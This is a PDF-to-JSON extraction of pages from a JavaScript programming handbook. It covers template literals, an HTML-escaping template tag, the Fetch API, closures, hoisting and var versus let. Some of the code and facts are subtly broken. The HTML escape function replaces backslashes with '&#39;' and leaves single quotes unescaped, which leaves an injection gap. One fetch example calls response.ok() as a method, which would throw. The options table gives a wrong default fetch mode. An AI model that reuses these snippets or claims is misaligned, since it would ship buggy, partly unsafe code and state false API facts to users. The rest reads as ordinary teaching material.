        "text": "Section 54.3: Raw strings",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  String. raw  tag function can be used with template literals to access a version of their contents without interpreting any backslash escape sequences. String. raw `\\n`  will contain a backslash and the lowercase letter n, while  `\\n`  or  ' \\n '  would contain a single newline character instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "const  patternString  =  String. raw `Welcome ,   ( \\w +)! ` ; const  pattern  =   new  RegExp ( patternString ); const  message  =   \"Welcome, John!\" ; pattern. exec ( message ); [ \"Welcome, John!\" ,   \"John\" ]",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 54.4: Templating HTML With Template Strings",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "You can create an  HTML`...`  template string tag function to automatically encodes interpolated values. (This requires that interpolated values are only used as text, and  may not be safe if interpolated values are used in code  such as scripts or styles.)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "class  HTMLString  extends  String  {    static  escape ( text )   {      if   ( text  instanceof  HTMLString )   {        return  text ;      }      return   new  HTMLString (         String ( text )             . replace ( /&/g ,   '&amp;' )             . replace ( /</g ,   '&lt;' )             . replace ( />/g ,   '&gt;' )             . replace ( /\"/g ,   '&quot;' )             . replace ( /\\\\/g ,   '&#39;' ));    } } function  HTML ( strings ,  ... substitutions )   {    const  escapedFlattenedSubstitutions  =       substitutions. map ( s  =>   [] . concat ( s ) . map ( HTMLString. escape ) . join ( '' ));    const  pieces  =   [];    for   ( const  i of strings. keys ())   {     pieces. push ( strings [ i ],  escapedFlattenedSubstitutions  [ i ]   ||   '' );    }    return   new  HTMLString ( pieces. join ( '' )); } const  title  =   \"Hello World\" ; const  iconSrc  =   \"/images/logo.png\" ; const  names  =   [ \"John\" ,   \"Jane\" ,   \"Joe\" ,   \"Jill\" ]; document. body . innerHTML   =  HTML`    < h1 >< img src = \"${iconSrc}\"   />  $ { title }</ h1 >",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 308",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "   < ul >  $ { names. map ( name  =>  HTML`      < li > $ { name }</ li >   ` )}   </ ul > ` ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 54.5: Introduction",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Template Literals act like strings with special features. They are enclosed by by the back-tick  ``  and can be spanned across multiple lines. Template Literals can contain embedded expressions too. These expressions are indicated by a  $  sign and curly braces  {}",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//A single line Template Literal  ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  aLiteral  =  `single line string data` ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Template Literal that spans across lines      ",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  anotherLiteral  =  `string data that spans          across multiple lines of code` ;     ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Template Literal with an embedded expression",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   2 ; var  y  =   3 ; var  theTotal  =  `The total is $ { x  +  y } ` ;       // Contains \"The total is 5\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Comparison of a string and a template literal",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  aString  =   \"single line string data\" console. log ( aString  ===  aLiteral )                           //Returns true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "There are many other features of String Literals such as Tagged Template Literals and Raw property. These are demonstrated in other examples.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 309",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 55: Fetch",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Options Details",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "method",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The HTTP method to use for the request. ex:  GET ,  POST ,  PUT ,  DELETE ,  HEAD . Defaults to  GET .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "headers",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A  Headers  object containing additional HTTP headers to include in the request. body The request payload, can be a  string  or a  FormData  object. Defaults to  undefined",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "cache",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The caching mode.  default ,  reload ,  no - cache",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "referrer",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The referrer of the request. mode",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "cors ,  no - cors ,  same - origin . Defaults to  no - cors . credentials omit ,  same - origin ,  include . Defaults to  omit . redirect follow ,  error ,  manual . Defaults to  follow . integrity",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Associated integrity metadata. Defaults to empty string.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.1: Getting JSON data",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "// get some data from stackoverflow",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "fetch ( \"https://api.stackexchange.com/2.2/questions/featured?order=desc&sort=activity&site=stackover flow\" )   . then ( resp  =>  resp. json ())   . then ( json  =>  console. log ( json ))   . catch ( err  =>  console. log ( err ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 55.2: Set Request Headers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "fetch ( '/example.json' ,   {     headers :   new  Headers ({          'Accept' :   'text/plain' ,          'X-Your-Custom-Header' :   'example value'      }) });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 55.3: POST Data",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Posting form data",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( ` / example / submit` ,   {     method :   'POST' ,     body :   new  FormData ( document. getElementById ( 'example-form' )) });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Posting JSON data",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( ` / example / submit. json ` ,   {     method :   'POST' ,     body :  JSON. stringify ({         email :  document. getElementById ( 'example-email' ) . value ,         comment :  document. getElementById ( 'example-comment' ) . value      }) });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 310",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.4: Send cookies",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The fetch function does not send cookies by default. There are two possible ways to send cookies: Only send cookies if the URL is on the same origin as the calling script. 1.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( '/login' ,   {     credentials :   'same-origin' })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Always send cookies, even for cross-origin calls. 2.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( 'https://otherdomain.com/login' ,   {     credentials :   'include' })",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 55.5: GlobalFetch",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  GlobalFetch  interface exposes the  fetch  function, which can be used to request resources.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "fetch ( '/path/to/resource.json' )     . then ( response  =>   {          if   (! response. ok ())   {              throw   new  Error ( \"Request failed!\" );          }                      return  response. json ();      })     . then ( json  =>   {         console. log ( json );      });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The resolved value is a  Response  Object. This Object contains the body of the response, as well as its status and headers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 55.6: Using Fetch to Display Questions from the Stack Over\ufb02ow API",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "const  url  =        'http://api.stackexchange.com/2.2/questions?site=stackoverflow&tagged=javascript' ; const  questionList  =  document. createElement ( 'ul' ); document. body . appendChild ( questionList ); const  responseData  =  fetch ( url ) . then ( response  =>  response. json ()); responseData. then (({ items ,  has_more ,  quota_max ,  quota_remaining })   =>   {    for   ( const   { title ,  score ,  owner ,  link ,  answer_count }  of items )   {      const  listItem  =  document. createElement ( 'li' );     questionList. appendChild ( listItem );      const  a  =  document. createElement ( 'a' );     listItem. appendChild ( a );     a. href   =  link ;     a. textContent   =  ` [ $ { score }]  $ { title }   ( by $ { owner. display_name   ||   'somebody' }) `    } });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 311",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 56: Scope",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 56.1: Closures",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When a function is declared, variables in the context of its  declaration  are captured in its scope. For example, in the code below, the variable  x  is bound to a value in the outer scope, and then the reference to  x  is captured in the context of  bar :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   4 ;   // declaration in outer scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  bar ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( x );   // outer scope is captured on declaration } bar ();   // prints 4 to console",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  4 This concept of \"capturing\" scope is interesting because we can use and modify variables from an outer scope even after the outer scope exits. For example, consider the following:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  x  =   4 ;   // declaration in outer scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     function  bar ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        console. log ( x );   // outer scope is captured on declaration",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     }      return  bar ;    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // x goes out of scope after foo returns }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  barWithX  =  foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "barWithX ();   // we can still access x",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  4 In the above example, when  foo  is called, its context is captured in the function  bar . So even after it returns,  bar can still access and modify the variable  x . The function  foo , whose context is captured in another function, is said to",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "be a  closure .",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Private data",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This lets us do some interesting things, such as de\ufb01ning \"private\" variables that are visible only to a speci\ufb01c function or set of functions. A contrived (but popular) example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  makeCounter ()   {      var  counter  =   0 ;      return   {         value :   function   ()   {              return  counter ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 312",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "         },         increment :   function   ()   {             counter ++;          }      }; } var  a  =  makeCounter (); var  b  =  makeCounter (); a. increment (); console. log ( a. value ()); console. log ( b. value ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output: 1 0 When  makeCounter ()  is called, a snapshot of the context of that function is saved. All code inside  makeCounter () will use that snapshot in their execution. Two calls of  makeCounter ()  will thus create two di\ufb00erent snapshots, with their own copy of  counter .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Immediately-invoked function expressions (IIFE)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Closures are also used to prevent global namespace pollution, often through the use of immediately-invoked function expressions.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Immediately-invoked function expressions  (or, perhaps more intuitively,  self-executing anonymous functions ) are",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "essentially closures that are called right after declaration. The general idea with IIFE's is to invoke the side-e\ufb00ect of creating a separate context that is accessible only to the code within the IIFE. Suppose we want to be able to reference  jQuery  with  $ . Consider the naive method, without using an IIFE:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  $  =  jQuery ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// we've just polluted the global namespace by assigning window.$ to jQuery",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In the following example, an IIFE is used to ensure that the  $  is bound to  jQuery  only in the context created by the closure:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function   ( $ )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // $ is assigned to jQuery here",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "})( jQuery );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// but window.$ binding doesn't exist, so no pollution",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "See  the canonical answer on Stackover\ufb02ow  for more information on closures.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.2: Hoisting",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "What is hoisting?",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hoisting  is a mechanism which moves all variable and function declarations to the top of their scope. However, variable assignments still happen where they originally were. For example, consider the following code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 313",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo );    //  \u2192  undefined var  foo  =   42 ; console. log ( foo );    //  \u2192  42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above code is the same as:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  foo ;               //  \u2192  Hoisted variable declaration",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo );      //  \u2192  undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo  =   42 ;              //  \u2192  variable assignment remains in the same place",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( foo );      //  \u2192  42",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that due to hoisting the above  undefined  is not the same as the  not defined  resulting from running:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo );      //  \u2192  foo is not defined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A similar principle applies to functions. When functions are assigned to a variable (i.e. a  function expression ), the variable declaration is hoisted while the assignment remains in the same place. The following two code snippets are equivalent.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo ( 2 ,   3 ));       //  \u2192  foo is not a function var  foo  =   function ( a ,  b )   {      return  a  *  b ; } var  foo ; console. log ( foo ( 2 ,   3 ));       //  \u2192  foo is not a function foo  =   function ( a ,  b )   {      return  a  *  b ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "When declaring  function statements , a di\ufb00erent scenario occurs. Unlike function statements, function declarations are hoisted to the top of their scope. Consider the following code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( foo ( 2 ,   3 ));    //  \u2192  6 function  foo ( a ,  b )   {      return  a  *  b ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The above code is the same as the next code snippet due to hoisting:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  foo ( a ,  b )   {      return  a  *  b ; } console. log ( foo ( 2 ,   3 ));    //  \u2192  6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Here are some examples of what is and what isn't hoisting:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// Valid code:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo (); function  foo ()   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Invalid code: bar ();                       //  \u2192  TypeError: bar is not a function",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 314",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  bar  =   function   ()   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Valid code:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    bar (); } function  bar ()   {}",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Invalid code:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    bar ();                  //  \u2192  TypeError: bar is not a function }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  bar  =   function   ()   {};",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// (E) valid:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    bar (); } var  bar  =   function (){}; foo ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Limitations of Hoisting",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Initializing a variable can not be Hoisted or In simple JavaScript Hoists declarations not initialization. For example: The below scripts will give di\ufb00erent outputs.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   2 ; var  y  =   4 ; alert ( x  +  y );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will give you an output of 6. But this...",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   2 ; alert ( x  +  y ); var  y  =   4 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will give you an output of NaN. Since we are initializing the value of y, the JavaScript Hoisting is not happening, so the y value will be unde\ufb01ned. The JavaScript will consider that y is not yet declared. So the second example is same as of below.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   2 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  y ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "alert ( x  +  y ); y  =   4 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will give you an output of NaN.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 315",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.3: Di\ue023erence between var and let",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": [
            "output_directory\\image_331_1.png"
        ]
    },
    {
        "text": "(Note: All examples using  let  are also valid for  const )",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  is available in all versions of JavaScript, while  let  and  const  are part of ECMAScript 6 and  only available in some newer browsers . var  is scoped to the containing function or the global space, depending when it is declared:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   4 ;   // global scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  DoThings ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  x  =   7 ;   // function scope",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    console. log ( x ); } console. log ( x );   // >> 4 DoThings ();       // >> 7 console. log ( x );   // >> 4",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That means it \"escapes\"  if  statements and all similar block constructs:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   4 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   ( true )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  x  =   7 ; } console. log ( x );   // >> 7 for   ( var  i  =   0 ;  i  <   4 ;  i ++)   {      var  j  =   10 ; } console. log ( i );   // >> 4 console. log ( j );   // >> 10",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "By comparison,  let  is block scoped:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  x  =   4 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if   ( true )   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     let  x  =   7 ;     console. log ( x );   // >> 7 } console. log ( x );   // >> 4 for   ( let  i  =   0 ;  i  <   4 ;  i ++)   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 316",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     let  j  =   10 ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( i );   // >> \"ReferenceError: i is not defined\" console. log ( j );   // >> \"ReferenceError: j is not defined\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that  i  and  j  are only declared in the  for  loop and are therefore undeclared outside of it. There are several other crucial di\ufb00erences:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Global variable declaration",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In the top scope (outside any functions and blocks),  var  declarations put an element in the global object.  let  does not:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   4 ; let  y  =   7 ; console. log ( this . x );   // >> 4 console. log ( this . y );   // >> undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Re-declaration",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Declaring a variable twice using  var  doesn't produce an error (even though it's equivalent to declaring it once):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  x  =   4 ; var  x  =   7 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "With  let , this produces an error:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  x  =   4 ; let  x  =   7 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "TypeError: Identi\ufb01er  x  has already been declared The same is true when  y  is declared with  var :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  y  =   4 ; let  y  =   7 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "TypeError: Identi\ufb01er  y  has already been declared However variables declared with let can be reused (not re-declared) in a nested block",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  i  =   5 ;      {     let  i  =   6 ;    console. log ( i );   // >> 6 } console. log ( i );   // >> 5",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Within the block the outer  i  can be accessed, but if the within block has a  let  declaration for  i , the outer  i  can not be accessed and will throw a  ReferenceError  if used before the second is declared.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  i  =   5 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 317 {",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    i  =   6 ;    // outer i is unavailable within the Temporal Dead Zone",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     let  i ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ReferenceError: i is not de\ufb01ned",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Hoisting",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Variables declared both with  var  and  let  are hoisted. The di\ufb00erence is that a variable declared with  var  can be referenced before its own assignment, since it gets automatically assigned (with  undefined  as its value), but  let cannot \u2013 it speci\ufb01cally requires the variable to be declared before being invoked:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( x );   // >> undefined",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( y );   // >> \"ReferenceError: `y` is not defined\" //OR >> \"ReferenceError: can't access lexical declaration `y` before initialization\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  x  =   4 ; let  y  =   7 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The area between the start of a block and a  let  or  const  declaration is known as the  Temporal Dead Zone , and any references to the variable in this area will cause a  ReferenceError . This happens even if the  variable is assigned before being declared :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "y = 7 ;   // >> \"ReferenceError: `y` is not defined\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "let  y ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In non-strict-mode, assigning a value to a variable without any declaration, automatically declares the variable in the global scope. In this case, instead of  y  being automatically declared in the global scope,  let  reserves the variable's name ( y ) and does not allow any access or assignment to it before the line where it is declared/initialized.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
